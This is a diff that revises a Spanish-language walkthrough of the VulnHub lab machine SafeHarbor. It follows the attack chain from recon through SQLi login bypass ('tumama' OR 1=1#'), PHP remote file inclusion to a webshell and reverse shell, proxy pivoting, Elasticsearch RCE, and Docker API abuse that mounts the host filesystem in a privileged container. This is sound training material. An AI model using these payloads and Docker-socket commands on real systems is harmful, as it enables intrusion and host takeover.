@@ -1,45 +1,76 @@
+# SafeHarbor (VulnHub - Medium) WriteUp Español
 
-	Esta maquina es lograda para VirtualBox, pero como usamos VMware, pues hacemos cambios. En el grub inyectamos `init=/bin/bash`, cambiamos la contraseña de root y especificamos la ip. En este caso la interfaz de red que nos interesa es `ens33` y  procedemos con las siguientes líneas.
+[🦔](#PreRequerimientos) #PreRequerimientos
+- Inyección de comandos en GRUB
+- Configuración de IP manual
+- Sugerencia resolución DNS
+[🦔](#Reconocimiento) #Reconocimiento
+- Escaneo usual (IP, TTL, Puertos, Versiones y Servicios, Launchpad)
+- Reconocimiento Web
+[🦔](#VulnGathering) #VulnGathering
+- Instalación de `pyenv` + ejecución de versión antigua de python
+- Enumeración de directorios
+[🦔](#Engaño) #Engaño
+- Explicación `SQLi` clásica + inyección básica.
+[🦔](#Explotación) #Explotación
+- Manipulación de parámetros del servidor
+- Visualización de código PHP con wrappers base 64 + obtención de credenciales
+- Remote File Inclusion +Remote Code Execution (webshell)
+[🦔](#GanarControl) #GanarControl
+- Acceso a mysql con credenciales filtradas
+- Desprendimiento de sesión con `nohup`
+- Port Forwarding con chisel + proxychains + proxy socks5
+- Enumeración de contenedores + automatización con python y bash
+- Pivoteo de contenedores con explotación a versión vulnerable a RCE de ElasticSearch
+- Enrutamiento de tráfico con socat
+- Enlistar contenedores con curl
+- Montación de contenedor privilegiado + RCE
+- Creación de usuario + copia de ssh ky en authorized_keys
+[🦔](#Resultados-PoC) #Resultados-PoC
+
+
+_Presiona al erizo para dirigirte al contenido._
+#### PreRequerimientos
+Se detectó que la máquina estaba diseñada para VirtualBox; por lo que, se utilizó VMware, aunque fue necesario realizar modificaciones.
+Desde el GRUB, se inyectó el parámetro `init=/bin/bash` para obtener acceso root sin contraseña. A continuación se modificó la contraseña de usuario root y se configuró manualmente la red.
+La interfaz relevante fue `ens33` y se estableció la IP estática mediante:
 	
 	ifconfig ens33 192.168.0.77 netmask 255.255.255.0
 	route add default gw 192.168.0.1
 	
-	Aunque no es necesario, la configuración resultante no resuelve salida a internet, pero se puede corregir editando /etc/resolv.conf cambiando nameserver por 8.8.8.8 
+Aunque no es  esencial para el ejercicio, la configuración resultante no resuelve salida a Internet, esto se conseguiría editando `etc/resolv.conf` cambiando `nameserver` por `8.8.8.8`. 
 
-Tenemos la IP detectada `192.168.0.77`
-`$sudo arp-scan -I wlp2s0 --localnet`
-``` java
-[sudo] contraseña para kmxbay: 
-Interface: wlp2s0, type: EN10MB, MAC: d8:fc:93:53:a7:cd, IPv4: 192.168.0.21
-Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-192.168.0.1	    24:e4:ce:b3:4a:16	(Unknown)
-[...]
+#### Reconocimiento
+Se identificó la dirección IP de la máquina objetivo `192.168.0.77` mediante `ARP-scan`:
+``` python
+$sudo arp-scan -I wlp2s0 --localnet
+Interface: wlp2s0, type: [...]
+
 192.168.0.77	00:0c:29:50:ee:23	VMware, Inc.
 ```
+El equipo fue identificado como una máquina virtual de VMware.
 
-Con el comando ping obtenemos la siguiente información:
-```java
+Se verificó la conectividad con un `ping`, recibiendo respuestas con un TTL de 64, lo cual indica un sistema Linux sin NAT adicional:
+```python
 64 bytes from 192.168.0.77: icmp_seq=1 ttl=64 time=19.0 ms
 ```
 
-Obtenemos posibles puertos objetivo con:
-`sudo nmap -p- -sS --min-rate 5000 -n -Pn  192.168.0.77`
-```java
+Posteriormente se realizó un escaneo de puertos completo con Nmap:``
+```python
+$sudo nmap -p- -sS --min-rate 5000 -n -Pn  192.168.0.77
+[...]
 PORT     STATE    SERVICE
 22/tcp   open     ssh
 80/tcp   open     http
 2375/tcp filtered docker
 ```
 
-Obteniendo información:
-`sudo nmap -p22,80,2375 -sSCV 192.168.0.77`
-```java
+Un escaneo más detallado se ejecutó, para identificar versiones y servicios:
+```python
+$sudo nmap -p22,80,2375 -sSCV 192.168.0.77
 PORT     STATE    SERVICE VERSION
 22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 fc:c6:49:ce:9b:54:7f:57:6d:56:b3:0a:30:47:83:b4 (RSA)
-|   256 73:86:8d:97:2e:60:08:8a:76:24:3c:94:72:8f:70:f7 (ECDSA)
-|_  256 26:48:91:66:85:a2:39:99:f5:9b:62:da:f9:87:4a:e6 (ED25519)
+| [...]
 80/tcp   open     http    nginx 1.17.4
 | http-cookie-flags: 
 |   /: 
@@ -48,11 +79,23 @@ PORT     STATE    SERVICE VERSION
 |_http-server-header: nginx/1.17.4
 |_http-title: Login
 2375/tcp filtered docker
-
 ```
 
-Vía Launchpad, encontramos que el sistema operativo es Ubuntu Bionic.
-Revisando vulnerabilidad en ssh, encontramos algunos exploits:
+Gracias a headers HTTP y Launchpad, se determinó el SO como Ubuntu 18.04 (Bionic)
+
+Con `whatweb`, se identificaron las tecnologías del servidor web:
+```python
+$whatweb http://192.168.0.77/
+http://192.168.0.77/ [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.17.4], IP[192.168.0.77], PHP[7.2.7], PasswordField[password], Title[Login], X-Powered-By[PHP/7.2.7], nginx[1.17.4]
+```
+
+Como resumen de resultados, se obtuvo:
+- SSH en puerto 22: OpenSSH 7.6p1 (Ubuntu Bionic)
+- HTTP en puerto 80: nginx 1.17.4 con PHP 7.2.7
+- Docker en puerto 2375: Filtrado
+
+#### VulnGathering
+Se buscaron vulnerabilidades asociadas a la versión de `SSH` hallada . Entre los hallazgos, se encontró un exploit de enumeración de usuarios:
 ```java
 $searchsploit ssh user enumeration
 ------------------------------------------------- -------------------------------
@@ -66,75 +109,78 @@ OpenSSHd 7.2p2 - Username Enumeration            | linux/remote/40113.txt
 ------------------------------------------------- -------------------------------
 ```
 
-Obtenemos el exploit escogido y lo renombramos a `UserEnumeration22.py`
-`$searchsploit -m linux/remote/45939.py`
-```java
+Se seleccionó uno de estos exploits y se renombró a `UserEnumeration22.py
+```python
+$searchsploit -m linux/remote/45939.py
   Exploit: OpenSSH < 7.7 - User Enumeration (2)
       URL: https://www.exploit-db.com/exploits/45939
      Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
     Codes: CVE-2018-15473
  Verified: False
 File Type: Python script, ASCII text executable
+$mv 45939.py UserEnumeration22.py
 ```
-`$mv 45939.py UserEnumeration22.py`
-Como en el script vemos esta línea: `#!/usr/bin/env python2.7`, tendremos que resolver la ejecución de python2.7 en un entorno con python3. para esto con pyenv podemos instalar estas dependencias:
+
+En la línea: `#!/usr/bin/env python2.7` el script indica que se requiere una versión anterior de python.
+Dado lo anterior, la ejecución se resolvió con `pyenv` donde se instalaron las siguientes dependencias:
 ```bash
 sudo apt install -y make build-essential libssl-dev zlib1g-dev \
 libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \
 libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev \
 libffi-dev liblzma-dev
 ```
-Para pyenv, ejecutamos el código de https://pyenv.run.
-En la terminal que trabajamos agregamos esta líneas al PATH  y aplicamos los cambios:
+
+Se ejecutó el código de https://pyenv.run.
+En la terminal utilizada se agregaron esta lineas al PATH:
 ```python
 export PATH="$HOME/.pyenv/bin:$PATH"
 eval "$(pyenv init --path)"
 eval "$(pyenv init -)"
 eval "$(pyenv virtualenv-init -)"
-
 source ~/.bashrc
 ```
-Instalamos python2.7:
-`pyenv install 2.7.18 && pyenv global 2.7.18`
 
-De aquí sólo se tendrá que instalar paramiko con `pip2 install paramiko` y ejecutamos con los argumentos requeridos,validando el usuario root existe:
+Posteriormente se instaló `pyhon2.7` con: `pyenv install 2.7.18 && pyenv global 2.7.18`
+
+Después, sólo se instaló `paramiko` con `pip2 install paramiko` y se ejecutó con los argumentos requeridos,validando el usuario root existe:
 ```python
 $./UserEnumeration22.py 192.168.0.77 root 2>/dev/null
 [+] root is a valid username
 ```
-Pero antes de avanzar, notamos que cualquier valor de usuario parece ser válido:
+Aunque también se notó que los resultados se vuelven triviales, al obtener respuestas similares a cualquier valor introducido:
 ```java
 $./UserEnumeration22.py 192.168.0.77 tumama 2>/dev/null
 [+] tumama is a valid username
 ```
 
-Del lado del sitio web, revisamos que tecnología utiliza con whatweb:
-`$whatweb http://192.168.0.77/`
+ Se exploró el puerto 80, donde específicamente en directorios se llaron resultados con `gobuster` y el diccionario `directory-list-2.3-medium.txt`:
 ```python
-http://192.168.0.77/ [200 OK] Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.17.4], IP[192.168.0.77], PHP[7.2.7], PasswordField[password], Title[Login], X-Powered-By[PHP/7.2.7], nginx[1.17.4]
-```
-
-Encontramos varios directorios con `gobuster` y el diccionario `directory-list-2.3-medium.txt`:
-`$gobuster dir -u http://192.168.0.77/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,sh,txt`
-```java
+$gobuster dir -u http://192.168.0.77/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,sh,txt
+[...]
 /.html                (Status: 403) [Size: 214]
 /login.php            (Status: 200) [Size: 1303]
 /changelog.txt        (Status: 200) [Size: 242]
 /phpinfo.php          (Status: 200) [Size: 86117]
 ```
 
-Si vemos en phpinfo.php, notamos que los parámetros que causan RFI están en On:
-```html
-<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
-<tr><td class="e">allow_url_fopen</td><td class="v">On</td><td class="v">On</td></tr>
-<tr><td class="e">allow_url_include</td><td class="v">On</td><td class="v">On</td></tr>
-```
+ Dados los resultados anteriores, se consultó `phpinfo.php`, donde se observó que algunos parámetros específicos están en `On`, por lo que se validó la vulnerabilidad `LFI` y `RFI`:
 
-Explorando el sitio, vemos un login de un aparente banco el cual no fue vulnerable a credenciales débiles, pero sí a SQLi. Esto se descubrió al interceptar con BurpSuite, con la línea `user='+or1=1--+-&password='+or1=1--+-&s=Login` en el request, el código nos devuelve este mensaje:
-![[Pasted image 20250407145704.png]]
-Esto último quiere decir que: el código intenta contar filas de un resultado SQL, pero en lugar de ser una consulta válida, devolvió un false. 
-En otras palabras indica que el input se está metiendo en una consulta SQL sin validación, es decir, una clásica SQLi.
-Explicación rápida:
+| DirectiveLocal    | ValueMaster | Value |
+| ----------------- | ----------- | ----- |
+| allow_url_fopen   | On          | On    |
+| allow_url_include | On          | On    |
+#### Engaño
+ Con la información obtenida, se exploró vía web el sitio, para después, observar el login de un aparente banco, el cual no fue vulnerable a credenciales débiles, pero sí a SQLi. 
+ Esto último se descubrió al interceptar con BurpSuite, con la línea:
+```mysql
+ user='+or1=1--+-&password='+or1=1--+-&s=Login
+```
+  En el `request`, el código devolvió este mensaje:
+ 
+	Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/login.php on line 16
+
+El error en el último mensaje explica que: el código intentó contar filas de un resultado SQL, pero en lugar de ser una consulta válida, devolvió un `false`, es decir,  el `input` se está metiendo en una consulta SQL sin validación, es decir, una _clásica SQLi_.
+###### Explicación rápida:
 Probablemente en la línea 16, existe algo como:
 ```php
 $result = mysqli_query($conn, "SELECT * FROM users WHERE username = '$user' AND password = '$pass'");
@@ -146,7 +192,7 @@ SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
 ```
 Provocando que `mysqli_query()` de un `false` y que `mysqli_num_rows` un warning.
 
-Regresamos a la versión web, teniendo un poco más idea de como se compone nuestro sitio web e inyectamos un payload que pueda funcionar, como `tumama' OR 1=1#`, la respuesta en `http://192.168.0.77/OnlineBanking/index.php?p=welcome`
+Regresando a la versión web, se tuvo más idea del funcionamiento del sitio web, por lo que procedemos a inyectar un payload que pueda funcionar: `tumama' OR 1=1#`, la respuesta en `http://192.168.0.77/OnlineBanking/index.php?p=welcome` fue la siguiente:
 ```html
 <div align="center">
 <h4>Welcome, tumama' OR 1=1#.</h4>
@@ -154,7 +200,8 @@ Regresamos a la versión web, teniendo un poco más idea de como se compone nues
 </div>
 ```
 
-Revisando el sitio, en `http://192.168.0.77/OnlineBanking/index.php?p=balance` vemos nombres de usuarios a los que se puede hacer transferencia:
+#### Explotación
+Teniendo un nivel de compromiso con el perfilamiento anterior, se revisó el sitio, en `http://192.168.0.77/OnlineBanking/index.php?p=balance` para visualizar nombres de usuarios a los que se puede hacer transferencia:
 ```html
 <h4>Make a Transfer:</h4>
 <body>
@@ -173,7 +220,7 @@ Revisando el sitio, en `http://192.168.0.77/OnlineBanking/index.php?p=balance` v
     </select>
 ```
 
-También podemos validar las tecnologías usadas que se identificaron durante el reconocimiento en `http://192.168.0.77/OnlineBanking/index.php?p=about`:
+También se validaron las tecnologías usadas, identificadas en el reconocimiento en `http://192.168.0.77/OnlineBanking/index.php?p=about`:
 ```html
 <h4>About Harbor Bank Online</h4>
 <br></br>
@@ -243,6 +290,7 @@ eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:08
 Casi confirmadísimo que estamos en un contenedor, y solo queda entrar con una revShell.
 Por lo regular si hay php, entro con la opción de phassthru, pero esta vez la versión de pentest monkey en revshells.com fue más efectiva.
 
+#### GanarControl
 Retomamos el vector que se puede explotar con las credenciales de mysql
 ```bash
 / $ arp -a
@@ -303,7 +351,7 @@ for i in range(1, 255):
 ```
 
 En estas direcciones, encontramos algo diferente a Apache y Nginx solo en `172.20.0.2`:
-```http
+```python
 $proxychains whatweb http://172.20.0.2
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:1080-<><>-172.20.0.2:80-<><>-OK
@@ -462,7 +510,7 @@ Posteriormente, podemos montar en el socket un contenedor privilegiado. Es decir
 Nos apoyamos de [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html) y hacemos los ajustes para esta máquina.
 
 Creamos el contenedor, usando una de las imágenes `alpine:3.2`:
-```bash
+```python
 $proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/create?name=test -d '{"Image":"alpine:3.2", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
 ProxyChains-3.1 (http://proxychains.sf.net)
 |D-chain|-<>-127.0.0.1:1081-<>-127.0.0.1:1080-<--timeout
@@ -557,6 +605,7 @@ Last login:
 root@safeharbor:~# 
 ```
 
+#### Resultados-PoC
 Consultando las flags obtenidas:
 ```js
 root@safeharbor:~# cat Flag.txt 
